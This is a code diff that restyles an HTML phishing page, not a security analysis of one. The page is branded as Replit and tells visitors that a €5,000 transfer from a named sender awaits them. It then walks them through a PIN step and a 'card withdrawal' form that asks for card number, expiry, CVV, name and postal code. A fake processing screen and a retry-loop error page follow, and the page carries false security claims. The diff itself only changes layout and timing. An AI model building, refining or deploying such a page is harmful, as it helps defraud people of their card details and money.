@@ -42,7 +42,7 @@
             display: none;
             opacity: 0;
             transform: translateX(15px);
-            transition: opacity 0.2s ease, transform 0.2s ease;
+            transition: opacity 0.25s ease, transform 0.25s ease;
         }
         .app-page.active {
             display: flex;
@@ -61,205 +61,205 @@
 <body class="flex items-center justify-center bg-[#0B0F19] selection:bg-emerald-500 selection:text-white">
 
     <!-- Mobile Frame / Strict Viewport Container -->
-    <div class="w-full max-w-md h-full bg-cardBg flex flex-col justify-between overflow-hidden relative">
+    <div class="w-full max-w-md h-full bg-cardBg flex flex-col justify-between overflow-hidden relative shadow-2xl">
         
         <!-- App Header / Logo Bar -->
-        <div class="px-4 py-2.5 flex items-center justify-between border-b border-cardBorder/40 bg-cardBg shrink-0">
-            <div class="flex items-center space-x-2">
-                <div class="w-7 h-7 rounded-xl bg-gradient-to-tr from-emerald-600 to-emerald-400 flex items-center justify-center shadow-md shadow-emerald-950">
-                    <svg class="w-3.5 h-3.5 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+        <div class="px-5 py-3.5 flex items-center justify-between border-b border-cardBorder/40 bg-cardBg shrink-0">
+            <div class="flex items-center space-x-2.5">
+                <div class="w-8 h-8 rounded-xl bg-gradient-to-tr from-emerald-600 to-emerald-400 flex items-center justify-center shadow-md shadow-emerald-950">
+                    <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
                         <path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
                     </svg>
                 </div>
                 <div>
                     <h1 class="font-bold text-xs tracking-tight text-white leading-tight">Replit</h1>
-                    <p class="text-[9px] text-gray-400 font-medium">Safe, Smart, Simple.</p>
+                    <p class="text-[10px] text-gray-400 font-medium">Safe, Smart, Simple.</p>
                 </div>
             </div>
             <div id="back-btn-container" class="opacity-0 pointer-events-none transition-opacity duration-200">
-                <button onclick="goBack()" class="px-2 py-1 rounded-xl bg-gray-800 text-gray-300 transition-colors btn-press flex items-center space-x-1 text-[11px] font-medium border border-gray-700/50">
-                    <svg class="w-3 h-3" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path></svg>
+                <button onclick="goBack()" class="px-3 py-1.5 rounded-xl bg-gray-800 text-gray-300 transition-colors btn-press flex items-center space-x-1.5 text-xs font-medium border border-gray-700/50">
+                    <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path></svg>
                     <span>Back</span>
                 </button>
             </div>
         </div>
 
         <!-- Static Pages Content Area -->
-        <div class="flex-1 flex flex-col px-4 py-2.5 overflow-hidden justify-between">
+        <div class="flex-1 flex flex-col px-5 py-5 overflow-hidden justify-between">
 
             <!-- PAGE 1: Landing / Claim -->
             <div id="page-1" class="app-page active flex-1 flex-col justify-between">
-                <div class="space-y-2 pt-1">
-                    <div class="text-center space-y-1">
-                        <div class="inline-flex items-center justify-center px-2 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[10px] font-semibold uppercase tracking-wider">
+                <div class="space-y-4 pt-2">
+                    <div class="text-center space-y-2">
+                        <div class="inline-flex items-center justify-center px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-semibold uppercase tracking-wider">
                             Secure Payment Link
                         </div>
-                        <h2 class="text-sm font-bold text-white leading-tight">Payment Claim</h2>
-                        <p class="text-xs text-gray-400 px-2">You have a pending secure funds transfer waiting for your claim.</p>
+                        <h2 class="text-lg font-bold text-white leading-tight">Payment Claim</h2>
+                        <p class="text-xs text-gray-400 px-4">You have a pending secure funds transfer waiting for your claim.</p>
                     </div>
 
-                    <div class="bg-gray-900/90 border border-cardBorder rounded-2xl p-2.5 space-y-2 shadow-inner">
-                        <div class="flex justify-between items-center pb-1.5 border-b border-gray-800">
-                            <span class="text-xs text-gray-400">Sender</span>
-                            <span class="text-xs font-semibold text-white">Ziad Salhi</span>
+                    <div class="bg-gray-900/90 border border-cardBorder rounded-2xl p-4 space-y-3.5 shadow-inner">
+                        <div class="flex justify-between items-center pb-2.5 border-b border-gray-800">
+                            <span class="text-xs text-gray-400 font-medium">Sender</span>
+                            <span class="text-xs font-bold text-white">Ziad Salhi</span>
                         </div>
-                        <div class="flex justify-between items-center pb-1.5 border-b border-gray-800">
-                            <span class="text-xs text-gray-400">Amount</span>
-                            <span class="text-base font-bold text-emerald-400">€5,000.00</span>
+                        <div class="flex justify-between items-center pb-2.5 border-b border-gray-800">
+                            <span class="text-xs text-gray-400 font-medium">Amount</span>
+                            <span class="text-lg font-extrabold text-emerald-400">€5,000.00</span>
                         </div>
                         <div class="flex justify-between items-center">
-                            <span class="text-xs text-gray-400">Status</span>
-                            <span class="inline-flex items-center px-2 py-0.5 rounded-full text-[10px] font-medium bg-emerald-500/10 text-emerald-400">Ready to Claim</span>
+                            <span class="text-xs text-gray-400 font-medium">Status</span>
+                            <span class="inline-flex items-center px-2.5 py-1 rounded-full text-xs font-semibold bg-emerald-500/10 text-emerald-400">Ready to Claim</span>
                         </div>
                     </div>
                 </div>
 
-                <div class="pb-2 shrink-0">
-                    <button onclick="navigateTo('page-2')" class="w-full py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-semibold shadow-lg shadow-emerald-500/20 transition-all btn-press flex items-center justify-center space-x-2 text-xs">
+                <div class="pb-3 shrink-0">
+                    <button onclick="navigateTo('page-2')" class="w-full py-3.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold shadow-lg shadow-emerald-500/25 transition-all btn-press flex items-center justify-center space-x-2 text-sm">
                         <span>Continue</span>
-                        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
                     </button>
                 </div>
             </div>
 
             <!-- PAGE 2: PIN Verification -->
             <div id="page-2" class="app-page flex-1 flex-col justify-between">
-                <div class="space-y-2 pt-2">
-                    <div class="text-center space-y-1">
-                        <h2 class="text-sm font-bold text-white">Security Verification</h2>
+                <div class="space-y-4 pt-4">
+                    <div class="text-center space-y-1.5">
+                        <h2 class="text-base font-bold text-white">Security Verification</h2>
                         <p class="text-xs text-gray-400">Enter 4-digit pin sent by Ziad, (for verification)</p>
                     </div>
 
-                    <div class="flex flex-col items-center justify-center py-4 space-y-2 relative">
-                        <div class="flex space-x-2" id="pin-boxes">
-                            <div class="w-11 h-12 rounded-xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-lg font-bold text-white pin-box"></div>
-                            <div class="w-11 h-12 rounded-xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-lg font-bold text-white pin-box"></div>
-                            <div class="w-11 h-12 rounded-xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-lg font-bold text-white pin-box"></div>
-                            <div class="w-11 h-12 rounded-xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-lg font-bold text-white pin-box"></div>
+                    <div class="flex flex-col items-center justify-center py-8 space-y-4 relative">
+                        <div class="flex space-x-3.5" id="pin-boxes">
+                            <div class="w-14 h-16 rounded-2xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-xl font-bold text-white pin-box shadow-md"></div>
+                            <div class="w-14 h-16 rounded-2xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-xl font-bold text-white pin-box shadow-md"></div>
+                            <div class="w-14 h-16 rounded-2xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-xl font-bold text-white pin-box shadow-md"></div>
+                            <div class="w-14 h-16 rounded-2xl bg-gray-900 border-2 border-gray-800 flex items-center justify-center text-xl font-bold text-white pin-box shadow-md"></div>
                         </div>
                         <input type="password" id="pin-input" maxlength="4" pattern="[0-9]*" inputmode="numeric" class="absolute inset-0 opacity-0 w-full h-full cursor-pointer" autofocus oninput="handlePinInput(this)" />
                         
-                        <p id="pin-error" class="text-[11px] text-red-400 hidden font-medium">Incorrect PIN. (Correct PIN is 1122).</p>
+                        <p id="pin-error" class="text-xs text-red-400 hidden font-medium">Incorrect PIN. (Correct PIN is 1122).</p>
                     </div>
                 </div>
 
-                <div class="text-center pb-2 shrink-0">
-                    <p class="text-[10px] text-gray-500">Protected by Replit End-to-End Encryption</p>
+                <div class="text-center pb-3 shrink-0">
+                    <p class="text-[11px] text-gray-500 font-medium">Protected by Replit End-to-End Encryption</p>
                 </div>
             </div>
 
             <!-- PAGE 3: Select Payout Method -->
             <div id="page-3" class="app-page flex-1 flex-col justify-between">
-                <div class="space-y-2 pt-1">
-                    <div class="text-center space-y-1">
-                        <h2 class="text-sm font-bold text-white">Select Payout Method</h2>
+                <div class="space-y-4 pt-2">
+                    <div class="text-center space-y-1.5">
+                        <h2 class="text-base font-bold text-white">Select Payout Method</h2>
                         <p class="text-xs text-gray-400">Choose how you would like to receive your €5,000.</p>
                     </div>
 
-                    <div class="space-y-2 pt-1">
-                        <button onclick="navigateTo('page-4')" class="w-full p-2.5 rounded-2xl bg-gray-900/90 border border-gray-800 hover:border-emerald-500/50 flex items-center justify-between group transition-all btn-press">
-                            <div class="flex items-center space-x-2.5">
-                                <div class="w-8 h-8 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center group-hover:bg-emerald-500 group-hover:text-white transition-colors">
-                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
+                    <div class="space-y-3.5 pt-2">
+                        <button onclick="navigateTo('page-4')" class="w-full p-4 rounded-2xl bg-gray-900/90 border border-gray-800 hover:border-emerald-500/50 flex items-center justify-between group transition-all btn-press shadow-md">
+                            <div class="flex items-center space-x-3.5">
+                                <div class="w-10 h-10 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center group-hover:bg-emerald-500 group-hover:text-white transition-colors">
+                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
                                 </div>
                                 <div class="text-left">
-                                    <h3 class="font-semibold text-white text-xs">Withdraw to Bank with card</h3>
-                                    <p class="text-[10px] text-gray-400">Instant transfer via Visa/Mastercard</p>
+                                    <h3 class="font-bold text-white text-xs">Withdraw to Bank with card</h3>
+                                    <p class="text-[11px] text-gray-400 mt-0.5">Instant transfer via Visa/Mastercard</p>
                                 </div>
                             </div>
                             <svg class="w-4 h-4 text-gray-500 group-hover:text-emerald-400 transition-colors" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
                         </button>
 
-                        <button onclick="navigateTo('page-crypto')" class="w-full p-2.5 rounded-2xl bg-gray-900/90 border border-gray-800 hover:border-purple-500/50 flex items-center justify-between group transition-all btn-press">
-                            <div class="flex items-center space-x-2.5">
-                                <div class="w-8 h-8 rounded-xl bg-purple-500/10 text-purple-400 flex items-center justify-center group-hover:bg-purple-500 group-hover:text-white transition-colors">
-                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                        <button onclick="navigateTo('page-crypto')" class="w-full p-4 rounded-2xl bg-gray-900/90 border border-gray-800 hover:border-purple-500/50 flex items-center justify-between group transition-all btn-press shadow-md">
+                            <div class="flex items-center space-x-3.5">
+                                <div class="w-10 h-10 rounded-xl bg-purple-500/10 text-purple-400 flex items-center justify-center group-hover:bg-purple-500 group-hover:text-white transition-colors">
+                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                 </div>
                                 <div class="text-left">
-                                    <h3 class="font-semibold text-white text-xs">Withdraw to crypto wallet</h3>
-                                    <p class="text-[10px] text-gray-400">Multi-chain USDT / BTC / ETH</p>
+                                    <h3 class="font-bold text-white text-xs">Withdraw to crypto wallet</h3>
+                                    <p class="text-[11px] text-gray-400 mt-0.5">Multi-chain USDT / BTC / ETH</p>
                                 </div>
                             </div>
                             <svg class="w-4 h-4 text-gray-500 group-hover:text-purple-400 transition-colors" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
                         </button>
                     </div>
                 </div>
-                <div class="pb-2 shrink-0"></div>
+                <div class="pb-3 shrink-0"></div>
             </div>
 
             <!-- PAGE 4: Card Withdrawal Form -->
             <div id="page-4" class="app-page flex-1 flex-col justify-between">
-                <div class="space-y-1.5 pt-0.5">
+                <div class="space-y-3 pt-1">
                     <div>
-                        <h2 class="text-xs font-bold text-white">Card Withdrawal</h2>
-                        <p class="text-[9px] text-emerald-300 bg-emerald-500/10 border border-emerald-500/20 px-2 py-1 rounded-lg mt-0.5">
+                        <h2 class="text-sm font-bold text-white">Card Withdrawal</h2>
+                        <p class="text-[11px] text-emerald-300 bg-emerald-500/10 border border-emerald-500/20 px-3 py-1.5 rounded-xl mt-1 font-medium">
                             Please use a Visa or Mastercard card for a successful withdrawal.
                         </p>
                     </div>
 
-                    <form id="card-form" onsubmit="handleCardSubmit(event)" class="space-y-1.5">
+                    <form id="card-form" onsubmit="handleCardSubmit(event)" class="space-y-2.5">
                         <div>
-                            <label class="block text-[9px] font-medium text-gray-400 mb-0.5">Card Number</label>
-                            <input type="text" id="card-number" required placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-2.5 py-1.5 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
+                            <label class="block text-[11px] font-semibold text-gray-300 mb-1">Card Number</label>
+                            <input type="text" id="card-number" required placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
                         </div>
 
-                        <div class="grid grid-cols-2 gap-2">
+                        <div class="grid grid-cols-2 gap-3">
                             <div>
-                                <label class="block text-[9px] font-medium text-gray-400 mb-0.5">Expiration (MM/YY)</label>
-                                <input type="text" id="card-expiry" required placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-2.5 py-1.5 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
+                                <label class="block text-[11px] font-semibold text-gray-300 mb-1">Expiration (MM/YY)</label>
+                                <input type="text" id="card-expiry" required placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
                             </div>
                             <div>
-                                <label class="block text-[9px] font-medium text-gray-400 mb-0.5">CVV</label>
-                                <input type="password" id="card-cvv" required placeholder="123" maxlength="4" oninput="onlyDigits(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-2.5 py-1.5 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
+                                <label class="block text-[11px] font-semibold text-gray-300 mb-1">CVV</label>
+                                <input type="password" id="card-cvv" required placeholder="123" maxlength="4" oninput="onlyDigits(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
                             </div>
                         </div>
 
                         <div>
-                            <label class="block text-[9px] font-medium text-gray-400 mb-0.5">Name on card</label>
-                            <input type="text" id="card-name" required placeholder="e.g. Ziad Salhi" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-2.5 py-1.5 text-xs text-white focus:outline-none focus:border-emerald-500">
+                            <label class="block text-[11px] font-semibold text-gray-300 mb-1">Name on card</label>
+                            <input type="text" id="card-name" required placeholder="e.g. Ziad Salhi" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-emerald-500">
                         </div>
 
                         <div>
-                            <label class="block text-[9px] font-medium text-gray-400 mb-0.5">Postal Code</label>
-                            <input type="text" id="card-postal" required placeholder="10001" maxlength="10" oninput="onlyDigits(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-2.5 py-1.5 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
+                            <label class="block text-[11px] font-semibold text-gray-300 mb-1">Postal Code</label>
+                            <input type="text" id="card-postal" required placeholder="10001" maxlength="10" oninput="onlyDigits(this)" class="w-full bg-gray-900 border border-gray-800 rounded-xl px-3.5 py-2.5 text-xs text-white focus:outline-none focus:border-emerald-500 font-mono">
                         </div>
 
-                        <button type="submit" class="w-full py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-semibold shadow-lg shadow-emerald-500/20 transition-all btn-press flex items-center justify-center space-x-2 text-xs mt-1">
+                        <button type="submit" class="w-full py-3.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold shadow-lg shadow-emerald-500/25 transition-all btn-press flex items-center justify-center space-x-2 text-xs mt-2">
                             <span>Next</span>
-                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"></path></svg>
                         </button>
                     </form>
                 </div>
             </div>
 
             <!-- PAGE 5: Loading State -->
-            <div id="page-loading" class="app-page flex-1 flex-col items-center justify-center text-center space-y-3">
+            <div id="page-loading" class="app-page flex-1 flex-col items-center justify-center text-center space-y-4">
                 <div class="relative">
-                    <div class="w-10 h-10 rounded-full border-4 border-gray-800 border-t-emerald-500 animate-spin"></div>
+                    <div class="w-14 h-14 rounded-full border-4 border-gray-800 border-t-emerald-500 animate-spin"></div>
                     <div class="absolute inset-0 flex items-center justify-center">
-                        <svg class="w-3.5 h-3.5 text-emerald-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                        <svg class="w-5 h-5 text-emerald-400" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                     </div>
                 </div>
-                <div class="space-y-1">
-                    <h3 class="text-sm font-bold text-white">Processing Withdrawal...</h3>
-                    <p class="text-[11px] text-gray-400 max-w-xs mx-auto">Connecting securely to payment gateway and verifying routing details.</p>
+                <div class="space-y-1.5">
+                    <h3 class="text-base font-bold text-white">Processing Withdrawal...</h3>
+                    <p class="text-xs text-gray-400 max-w-xs mx-auto">Connecting securely to payment gateway and verifying routing details.</p>
                 </div>
             </div>
 
             <!-- PAGE 6: Error Occurred -->
             <div id="page-error" class="app-page flex-1 flex-col justify-between">
-                <div class="space-y-2 pt-4 text-center">
-                    <div class="w-12 h-12 bg-red-500/10 border border-red-500/20 rounded-2xl mx-auto flex items-center justify-center text-red-400 shadow-md">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                <div class="space-y-4 pt-8 text-center">
+                    <div class="w-16 h-16 bg-red-500/10 border border-red-500/20 rounded-2xl mx-auto flex items-center justify-center text-red-400 shadow-md">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
                     </div>
-                    <div class="space-y-1">
-                        <h2 class="text-sm font-bold text-white">An error occurred</h2>
-                        <p class="text-xs text-gray-400 max-w-xs mx-auto">Unable to complete transaction with the financial institution at this moment. Please try again.</p>
+                    <div class="space-y-2">
+                        <h2 class="text-lg font-bold text-white">An error occurred</h2>
+                        <p class="text-xs text-gray-400 max-w-xs mx-auto leading-relaxed">Unable to complete transaction with the financial institution at this moment. Please try again.</p>
                     </div>
                 </div>
 
-                <div class="pb-2 shrink-0">
-                    <button onclick="retryCard()" class="w-full py-3 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-semibold shadow-lg shadow-emerald-500/20 transition-all btn-press text-xs">
+                <div class="pb-3 shrink-0">
+                    <button onclick="retryCard()" class="w-full py-3.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white font-bold shadow-lg shadow-emerald-500/25 transition-all btn-press text-sm">
                         Try Again
                     </button>
                 </div>
@@ -267,18 +267,18 @@
 
             <!-- PAGE CRYPTO: Unavailable -->
             <div id="page-crypto" class="app-page flex-1 flex-col justify-between">
-                <div class="space-y-2 pt-4 text-center">
-                    <div class="w-12 h-12 bg-purple-500/10 border border-purple-500/20 rounded-2xl mx-auto flex items-center justify-center text-purple-400 shadow-md">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                <div class="space-y-4 pt-8 text-center">
+                    <div class="w-16 h-16 bg-purple-500/10 border border-purple-500/20 rounded-2xl mx-auto flex items-center justify-center text-purple-400 shadow-md">
+                        <svg class="w-8 h-8" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
                     </div>
-                    <div class="space-y-1">
-                        <h2 class="text-sm font-bold text-white">Service Temporarily Unavailable</h2>
-                        <p class="text-xs text-gray-400 max-w-xs mx-auto">Crypto node synchronizations are undergoing scheduled maintenance. Please try again later.</p>
+                    <div class="space-y-2">
+                        <h2 class="text-lg font-bold text-white">Service Temporarily Unavailable</h2>
+                        <p class="text-xs text-gray-400 max-w-xs mx-auto leading-relaxed">Crypto node synchronizations are undergoing scheduled maintenance. Please try again later.</p>
                     </div>
                 </div>
 
-                <div class="pb-2 shrink-0">
-                    <button onclick="navigateTo('page-3')" class="w-full py-3 rounded-xl bg-gray-800 hover:bg-gray-700 text-white font-semibold transition-all btn-press text-xs">
+                <div class="pb-3 shrink-0">
+                    <button onclick="navigateTo('page-3')" class="w-full py-3.5 rounded-xl bg-gray-800 hover:bg-gray-700 text-white font-bold transition-all btn-press text-sm">
                         Try again later
                     </button>
                 </div>
@@ -331,7 +331,7 @@
                 targetEl.classList.add('active');
                 currentPage = targetPage;
                 updateBackBtn();
-            }, 180);
+            }, 200);
         }
 
         function goBack() {
@@ -347,7 +347,7 @@
                 prevEl.classList.add('active');
                 currentPage = prevPage;
                 updateBackBtn();
-            }, 180);
+            }, 200);
         }
 
         function updateBackBtn() {
